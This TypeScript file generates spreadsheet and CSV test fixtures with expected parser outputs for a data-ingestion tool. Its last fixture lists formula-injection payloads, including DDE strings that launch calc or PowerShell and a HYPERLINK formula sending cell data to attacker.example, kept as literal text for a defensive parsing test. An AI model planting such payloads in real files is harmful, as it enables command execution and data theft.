import ExcelJS from 'exceljs';
import type { GeneratedFixture, GoldenWorkbook } from '../types.js';
import { styleHeaderRow, autoFitColumns, disambiguateHeaders } from './utils.js';

/**
 * Fixture 19: Formula Cells with Cached Values
 * Calculated formula cells where the evaluation result is pre-cached in cell metadata.
 */
export async function generate19FormulaCachedValues(): Promise<GeneratedFixture> {
  const wb = new ExcelJS.Workbook();
  const ws = wb.addWorksheet('Invoice_Calculations');

  const headers = ['Item SKU', 'Quantity', 'Unit Price', 'Subtotal', 'Tax Rate', 'Tax Amount', 'Grand Total'];
  const headerRow = ws.addRow(headers);
  styleHeaderRow(headerRow);

  const rawData: Array<{
    sku: string;
    qty: number;
    price: number;
    subtotal: number;
    taxRate: number;
    taxAmount: number;
    total: number;
  }> = [
    { sku: 'ITM-01', qty: 10, price: 50.0, subtotal: 500.0, taxRate: 0.08, taxAmount: 40.0, total: 540.0 },
    { sku: 'ITM-02', qty: 4, price: 125.0, subtotal: 500.0, taxRate: 0.08, taxAmount: 40.0, total: 540.0 },
    { sku: 'ITM-03', qty: 25, price: 12.0, subtotal: 300.0, taxRate: 0.05, taxAmount: 15.0, total: 315.0 },
    { sku: 'ITM-04', qty: 2, price: 450.0, subtotal: 900.0, taxRate: 0.1, taxAmount: 90.0, total: 990.0 },
    { sku: 'ITM-05', qty: 15, price: 80.0, subtotal: 1200.0, taxRate: 0.08, taxAmount: 96.0, total: 1296.0 },
  ];

  for (let i = 0; i < rawData.length; i++) {
    const d = rawData[i]!;
    const rowNum = i + 2;
    const row = ws.addRow([d.sku, d.qty, d.price]);

    // Subtotal formula = B{n} * C{n} with cached result
    row.getCell(4).value = { formula: `B${rowNum}*C${rowNum}`, result: d.subtotal };
    row.getCell(5).value = d.taxRate;
    // Tax Amount formula = D{n} * E{n} with cached result
    row.getCell(6).value = { formula: `D${rowNum}*E${rowNum}`, result: d.taxAmount };
    // Grand Total formula = D{n} + F{n} with cached result
    row.getCell(7).value = { formula: `D${rowNum}+F${rowNum}`, result: d.total };

    row.getCell(3).numFmt = '$#,##0.00';
    row.getCell(4).numFmt = '$#,##0.00';
    row.getCell(5).numFmt = '0.0%';
    row.getCell(6).numFmt = '$#,##0.00';
    row.getCell(7).numFmt = '$#,##0.00';
  }

  autoFitColumns(ws);

  const buffer = Buffer.from(await wb.xlsx.writeBuffer());

  const sanitizedKeys = disambiguateHeaders(headers);
  const rows = rawData.map((d) => ({
    [sanitizedKeys[0]!]: d.sku,
    [sanitizedKeys[1]!]: d.qty,
    [sanitizedKeys[2]!]: d.price,
    [sanitizedKeys[3]!]: d.subtotal,
    [sanitizedKeys[4]!]: d.taxRate,
    [sanitizedKeys[5]!]: d.taxAmount,
    [sanitizedKeys[6]!]: d.total,
  }));

  const golden: GoldenWorkbook = {
    fixtureId: '19_formula_cached_values',
    fixtureNumber: 19,
    filename: '19_formula_cached_values.xlsx',
    format: 'xlsx',
    description: 'Calculated formula cells where cached evaluation result is read directly without formula execution',
    sheets: [
      {
        sheetName: 'Invoice_Calculations',
        headers: {
          detectedRowIndex: 0,
          confidence: 1.0,
          originalHeaders: headers,
          sanitizedKeys,
        },
        inferredTypes: {
          item_sku: 'id',
          quantity: 'number',
          unit_price: 'currency',
          subtotal: 'currency',
          tax_rate: 'percent',
          tax_amount: 'currency',
          grand_total: 'currency',
        },
        rowCount: rows.length,
        columnCount: headers.length,
        rows,
        metadata: {
          hasFormulas: true,
          formulaEvaluationPresent: true,
        },
      },
    ],
  };

  return {
    id: '19_formula_cached_values',
    number: 19,
    filename: '19_formula_cached_values.xlsx',
    format: 'xlsx',
    description: golden.description,
    buffer,
    golden,
  };
}

/**
 * Fixture 20: Formula Cells Without Cached Values
 * Formula cells where formula expression exists but pre-calculated result is null/undefined.
 */
export async function generate20FormulaNoCachedValues(): Promise<GeneratedFixture> {
  const wb = new ExcelJS.Workbook();
  const ws = wb.addWorksheet('Uncalculated_Formulas');

  const headers = ['Part Number', 'Standard Cost', 'Overhead Multiplier', 'Total Estimated Cost'];
  const headerRow = ws.addRow(headers);
  styleHeaderRow(headerRow);

  const rawRows: Array<[string, number, number]> = [
    ['PRT-901', 120.0, 1.25],
    ['PRT-902', 85.5, 1.15],
    ['PRT-903', 340.0, 1.3],
    ['PRT-904', 55.0, 1.1],
    ['PRT-905', 210.0, 1.2],
  ];

  for (let i = 0; i < rawRows.length; i++) {
    const r = rawRows[i]!;
    const rowNum = i + 2;
    const row = ws.addRow([r[0], r[1], r[2]]);
    // Formula without cached result (no 'result' property provided)
    row.getCell(4).value = { formula: `B${rowNum}*C${rowNum}` };
    row.getCell(2).numFmt = '$#,##0.00';
    row.getCell(3).numFmt = '0.00';
    row.getCell(4).numFmt = '$#,##0.00';
  }

  autoFitColumns(ws);

  const buffer = Buffer.from(await wb.xlsx.writeBuffer());

  const sanitizedKeys = disambiguateHeaders(headers);
  const rows = rawRows.map((r) => ({
    [sanitizedKeys[0]!]: r[0],
    [sanitizedKeys[1]!]: r[1],
    [sanitizedKeys[2]!]: r[2],
    [sanitizedKeys[3]!]: null, // Uncalculated formula yields null in cached-only ingest
  }));

  const golden: GoldenWorkbook = {
    fixtureId: '20_formula_no_cached_values',
    fixtureNumber: 20,
    filename: '20_formula_no_cached_values.xlsx',
    format: 'xlsx',
    description: 'Spreadsheet containing uncalculated formulas without cached results safely handled as null',
    sheets: [
      {
        sheetName: 'Uncalculated_Formulas',
        headers: {
          detectedRowIndex: 0,
          confidence: 1.0,
          originalHeaders: headers,
          sanitizedKeys,
        },
        inferredTypes: {
          part_number: 'id',
          standard_cost: 'currency',
          overhead_multiplier: 'number',
          total_estimated_cost: 'currency',
        },
        rowCount: rows.length,
        columnCount: headers.length,
        rows,
        metadata: {
          hasFormulas: true,
          formulaEvaluationPresent: false,
        },
      },
    ],
  };

  return {
    id: '20_formula_no_cached_values',
    number: 20,
    filename: '20_formula_no_cached_values.xlsx',
    format: 'xlsx',
    description: golden.description,
    buffer,
    golden,
  };
}

/**
 * Fixture 21: Merged Data Cells
 * Merged cells in data rows representing grouped values (forward-filled across row spans).
 */
export async function generate21MergedDataCells(): Promise<GeneratedFixture> {
  const wb = new ExcelJS.Workbook();
  const ws = wb.addWorksheet('Store_Roster');

  const headers = ['Region', 'District', 'Store ID', 'Store Manager', 'Annual Target'];
  const headerRow = ws.addRow(headers);
  styleHeaderRow(headerRow);

  // Rows 2-4: Region "North America"
  // Rows 2-3: District "Pacific NW"
  ws.addRow(['North America', 'Pacific NW', 'STR-101', 'Rachel Green', 1200000]);
  ws.addRow(['', '', 'STR-102', 'Ross Geller', 950000]);
  ws.addRow(['', 'Mountain West', 'STR-103', 'Monica Geller', 1100000]);

  // Rows 5-7: Region "Europe"
  // Rows 5-6: District "DACH"
  ws.addRow(['Europe', 'DACH', 'STR-201', 'Chandler Bing', 1400000]);
  ws.addRow(['', '', 'STR-202', 'Joey Tribbiani', 1300000]);
  ws.addRow(['', 'UK & Ireland', 'STR-203', 'Phoebe Buffay', 1050000]);

  // Apply cell merges in worksheet
  ws.mergeCells('A2:A4'); // North America
  ws.mergeCells('B2:B3'); // Pacific NW
  ws.mergeCells('A5:A7'); // Europe
  ws.mergeCells('B5:B6'); // DACH

  autoFitColumns(ws);

  const buffer = Buffer.from(await wb.xlsx.writeBuffer());

  const sanitizedKeys = disambiguateHeaders(headers);

  // Forward-filled normalized rows
  const cleanRows = [
    ['North America', 'Pacific NW', 'STR-101', 'Rachel Green', 1200000],
    ['North America', 'Pacific NW', 'STR-102', 'Ross Geller', 950000],
    ['North America', 'Mountain West', 'STR-103', 'Monica Geller', 1100000],
    ['Europe', 'DACH', 'STR-201', 'Chandler Bing', 1400000],
    ['Europe', 'DACH', 'STR-202', 'Joey Tribbiani', 1300000],
    ['Europe', 'UK & Ireland', 'STR-203', 'Phoebe Buffay', 1050000],
  ];

  const rows = cleanRows.map((r) => ({
    [sanitizedKeys[0]!]: r[0],
    [sanitizedKeys[1]!]: r[1],
    [sanitizedKeys[2]!]: r[2],
    [sanitizedKeys[3]!]: r[3],
    [sanitizedKeys[4]!]: r[4],
  }));

  const golden: GoldenWorkbook = {
    fixtureId: '21_merged_data_cells',
    fixtureNumber: 21,
    filename: '21_merged_data_cells.xlsx',
    format: 'xlsx',
    description: 'Vertically merged data cells in grouped categorical columns forward-filled to preserve tabular integrity',
    sheets: [
      {
        sheetName: 'Store_Roster',
        headers: {
          detectedRowIndex: 0,
          confidence: 1.0,
          originalHeaders: headers,
          sanitizedKeys,
        },
        inferredTypes: {
          region: 'category',
          district: 'category',
          store_id: 'id',
          store_manager: 'text',
          annual_target: 'currency',
        },
        rowCount: rows.length,
        columnCount: headers.length,
        rows,
        metadata: {
          primaryKey: 'store_id',
          hasMergedCells: true,
        },
      },
    ],
  };

  return {
    id: '21_merged_data_cells',
    number: 21,
    filename: '21_merged_data_cells.xlsx',
    format: 'xlsx',
    description: golden.description,
    buffer,
    golden,
  };
}

/**
 * Fixture 22: CSV with Semicolon / Tab Delimiters
 * Semicolon-delimited European CSV file format.
 */
export function generate22CsvDelimiters(): GeneratedFixture {
  const headers = ['employee_id', 'full_name', 'department', 'annual_salary', 'hire_date'];
  const rawRows = [
    ['E-101', 'Greta Thunberg', 'Sustainability', 92000, '2021-04-01'],
    ['E-102', 'Lukas Meyer', 'Engineering', 108000, '2020-08-15'],
    ['E-103', 'Astrid Lind', 'Marketing', 85000, '2022-02-10'],
    ['E-104', 'Nils Holgersson', 'Logistics', 79000, '2019-11-01'],
    ['E-105', 'Karin Boye', 'Human Resources', 88000, '2023-01-20'],
  ];

  const csvContent = [
    headers.join(';'),
    ...rawRows.map((r) => r.join(';')),
  ].join('\r\n') + '\r\n';

  const buffer = Buffer.from(csvContent, 'utf-8');

  const sanitizedKeys = disambiguateHeaders(headers);
  const rows = rawRows.map((r) => ({
    [sanitizedKeys[0]!]: r[0],
    [sanitizedKeys[1]!]: r[1],
    [sanitizedKeys[2]!]: r[2],
    [sanitizedKeys[3]!]: r[3],
    [sanitizedKeys[4]!]: r[4],
  }));

  const golden: GoldenWorkbook = {
    fixtureId: '22_csv_delimiters',
    fixtureNumber: 22,
    filename: '22_csv_delimiters.csv',
    format: 'csv',
    description: 'European CSV delimited with semicolons (;)',
    sheets: [
      {
        sheetName: 'Sheet1',
        headers: {
          detectedRowIndex: 0,
          confidence: 1.0,
          originalHeaders: headers,
          sanitizedKeys,
        },
        inferredTypes: {
          employee_id: 'id',
          full_name: 'text',
          department: 'category',
          annual_salary: 'currency',
          hire_date: 'date',
        },
        rowCount: rows.length,
        columnCount: headers.length,
        rows,
        metadata: {
          primaryKey: 'employee_id',
          delimiter: ';',
        },
      },
    ],
  };

  return {
    id: '22_csv_delimiters',
    number: 22,
    filename: '22_csv_delimiters.csv',
    format: 'csv',
    description: golden.description,
    buffer,
    golden,
  };
}

/**
 * Fixture 23: CSV with Multiline Quoted Cells
 * Standard RFC 4180 CSV containing multiline quoted strings with embedded raw newlines.
 */
export function generate23CsvMultiline(): GeneratedFixture {
  const headers = ['ticket_id', 'requester', 'summary', 'error_log', 'priority'];

  const rawRows = [
    [
      'TCK-801',
      'dev-ops-agent',
      'Worker node OOM crash',
      'Error: Out of memory\nKill process 4012 (node)\nHeap limit 4096 MB exceeded',
      'Critical',
    ],
    [
      'TCK-802',
      'sec-scanner',
      'SSL cert expiration warning',
      'Warning: cert *.internal.io expires in 7 days\nIssuer: Let\'s Encrypt\nAction required',
      'High',
    ],
    [
      'TCK-803',
      'qa-bot',
      'Flaky network retry',
      'SocketTimeoutException: Connection timed out to db-read-replica-2:5432\nRetry 1: Success',
      'Medium',
    ],
    [
      'TCK-804',
      'audit-runner',
      'Missing IAM role tags',
      'Role arn:aws:iam::123456789:role/IngestTask is missing Environment tag\nComplies with rule E-04',
      'Low',
    ],
  ];

  // Helper to format RFC 4180 CSV line with quoting
  const csvLines = [headers.join(',')];
  for (const r of rawRows) {
    const fields = r.map((field) => {
      const str = String(field);
      if (str.includes(',') || str.includes('\n') || str.includes('"')) {
        return `"${str.replace(/"/g, '""')}"`;
      }
      return str;
    });
    csvLines.push(fields.join(','));
  }
  const csvContent = csvLines.join('\r\n') + '\r\n';
  const buffer = Buffer.from(csvContent, 'utf-8');

  const sanitizedKeys = disambiguateHeaders(headers);
  const rows = rawRows.map((r) => ({
    [sanitizedKeys[0]!]: r[0],
    [sanitizedKeys[1]!]: r[1],
    [sanitizedKeys[2]!]: r[2],
    [sanitizedKeys[3]!]: r[3],
    [sanitizedKeys[4]!]: r[4],
  }));

  const golden: GoldenWorkbook = {
    fixtureId: '23_csv_multiline',
    fixtureNumber: 23,
    filename: '23_csv_multiline.csv',
    format: 'csv',
    description: 'RFC 4180 CSV with multiline quoted strings containing embedded newlines',
    sheets: [
      {
        sheetName: 'Sheet1',
        headers: {
          detectedRowIndex: 0,
          confidence: 1.0,
          originalHeaders: headers,
          sanitizedKeys,
        },
        inferredTypes: {
          ticket_id: 'id',
          requester: 'category',
          summary: 'text',
          error_log: 'text',
          priority: 'category',
        },
        rowCount: rows.length,
        columnCount: headers.length,
        rows,
        metadata: {
          primaryKey: 'ticket_id',
          delimiter: ',',
        },
      },
    ],
  };

  return {
    id: '23_csv_multiline',
    number: 23,
    filename: '23_csv_multiline.csv',
    format: 'csv',
    description: golden.description,
    buffer,
    golden,
  };
}

/**
 * Fixture 24: Leading/Trailing Whitespace in Headers and Cells
 * Untrimmed spaces, tabs, and newlines in headers and cell contents.
 */
export async function generate24WhitespaceMessy(): Promise<GeneratedFixture> {
  const wb = new ExcelJS.Workbook();
  const ws = wb.addWorksheet('Messy_Spacing');

  // Untrimmed raw headers
  const messyHeaders = [
    '   Product SKU   ',
    '\tProduct Description  ',
    '  Category \t',
    '   Unit Cost   ',
    ' In Stock Flag ',
  ];

  const headerRow = ws.addRow(messyHeaders);
  styleHeaderRow(headerRow);

  const rawData = [
    ['  SKU-091  ', '\tHigh-Torque Servomotor  ', '   Robotics   ', '  450.00  ', '  TRUE '],
    ['  SKU-092  ', ' Planetary Gearbox 10:1   ', '   Mechanical  ', '  180.50  ', '  FALSE'],
    ['  SKU-093  ', '\tOptocoupler High-Speed  ', '   Electronics ', '  3.25    ', '  TRUE '],
    ['  SKU-094  ', ' Linear Actuator 200mm   ', '   Robotics   ', '  295.00  ', '  TRUE '],
    ['  SKU-095  ', ' Microcontroller Board   ', '   Electronics ', '  42.10   ', '  TRUE '],
  ];

  for (const r of rawData) {
    ws.addRow(r);
  }

  autoFitColumns(ws);

  const buffer = Buffer.from(await wb.xlsx.writeBuffer());

  const cleanHeaders = ['Product SKU', 'Product Description', 'Category', 'Unit Cost', 'In Stock Flag'];
  const sanitizedKeys = disambiguateHeaders(cleanHeaders);

  const cleanRows = [
    ['SKU-091', 'High-Torque Servomotor', 'Robotics', 450.0, true],
    ['SKU-092', 'Planetary Gearbox 10:1', 'Mechanical', 180.5, false],
    ['SKU-093', 'Optocoupler High-Speed', 'Electronics', 3.25, true],
    ['SKU-094', 'Linear Actuator 200mm', 'Robotics', 295.0, true],
    ['SKU-095', 'Microcontroller Board', 'Electronics', 42.1, true],
  ];

  const rows = cleanRows.map((r) => ({
    [sanitizedKeys[0]!]: r[0],
    [sanitizedKeys[1]!]: r[1],
    [sanitizedKeys[2]!]: r[2],
    [sanitizedKeys[3]!]: r[3],
    [sanitizedKeys[4]!]: r[4],
  }));

  const golden: GoldenWorkbook = {
    fixtureId: '24_whitespace_messy',
    fixtureNumber: 24,
    filename: '24_whitespace_messy.xlsx',
    format: 'xlsx',
    description: 'Messy untrimmed whitespace and tab characters in headers and cell values stripped during normalisation',
    sheets: [
      {
        sheetName: 'Messy_Spacing',
        headers: {
          detectedRowIndex: 0,
          confidence: 1.0,
          originalHeaders: messyHeaders,
          sanitizedKeys,
        },
        inferredTypes: {
          product_sku: 'id',
          product_description: 'text',
          category: 'category',
          unit_cost: 'currency',
          in_stock_flag: 'boolean',
        },
        rowCount: rows.length,
        columnCount: messyHeaders.length,
        rows,
        metadata: {
          primaryKey: 'product_sku',
        },
      },
    ],
  };

  return {
    id: '24_whitespace_messy',
    number: 24,
    filename: '24_whitespace_messy.xlsx',
    format: 'xlsx',
    description: golden.description,
    buffer,
    golden,
  };
}

/**
 * Fixture 25: Hostile Formula Injection Strings
 * Adversarial CSV/Excel formula injection vectors (=cmd, @SUM, +HYPERLINK, \t=calc, etc.).
 */
export async function generate25HostileFormulas(): Promise<GeneratedFixture> {
  const wb = new ExcelJS.Workbook();
  const ws = wb.addWorksheet('User_Submissions');

  const headers = ['Submission ID', 'User Handle', 'Feedback Text', 'Priority Code'];
  const headerRow = ws.addRow(headers);
  styleHeaderRow(headerRow);

  const rawRows = [
    ['SUB-001', 'security_tester_1', "=cmd|' /C calc'!A0", 'High'],
    ['SUB-002', 'security_tester_2', '@SUM(1, 999)', 'Medium'],
    ['SUB-003', 'security_tester_3', '+HYPERLINK("http://attacker.example/exfil?d="&A1, "Click for bonus")', 'Critical'],
    ['SUB-004', 'security_tester_4', "-2+5+cmd|' /C powershell -c calc'!A0", 'Critical'],
    ['SUB-005', 'security_tester_5', '\t=1+1', 'Low'],
    ['SUB-006', 'security_tester_6', '\n=calc', 'Low'],
    ['SUB-007', 'security_tester_7', '|dir', 'Medium'],
  ];

  for (const r of rawRows) {
    const row = ws.addRow(r);
    // Explicitly set text format so Excel does not execute them when opened
    row.getCell(3).numFmt = '@';
  }

  autoFitColumns(ws);

  const buffer = Buffer.from(await wb.xlsx.writeBuffer());

  const sanitizedKeys = disambiguateHeaders(headers);
  const rows = rawRows.map((r) => ({
    [sanitizedKeys[0]!]: r[0],
    [sanitizedKeys[1]!]: r[1],
    [sanitizedKeys[2]!]: r[2],
    [sanitizedKeys[3]!]: r[3],
  }));

  const golden: GoldenWorkbook = {
    fixtureId: '25_hostile_formulas',
    fixtureNumber: 25,
    filename: '25_hostile_formulas.xlsx',
    format: 'xlsx',
    description: 'Adversarial strings containing formula injection prefixes (=, +, -, @, \\t, \\n, |) strictly treated as literal text',
    sheets: [
      {
        sheetName: 'User_Submissions',
        headers: {
          detectedRowIndex: 0,
          confidence: 1.0,
          originalHeaders: headers,
          sanitizedKeys,
        },
        inferredTypes: {
          submission_id: 'id',
          user_handle: 'text',
          feedback_text: 'text',
          priority_code: 'category',
        },
        rowCount: rows.length,
        columnCount: headers.length,
        rows,
        metadata: {
          primaryKey: 'submission_id',
        },
      },
    ],
  };

  return {
    id: '25_hostile_formulas',
    number: 25,
    filename: '25_hostile_formulas.xlsx',
    format: 'xlsx',
    description: golden.description,
    buffer,
    golden,
  };
}
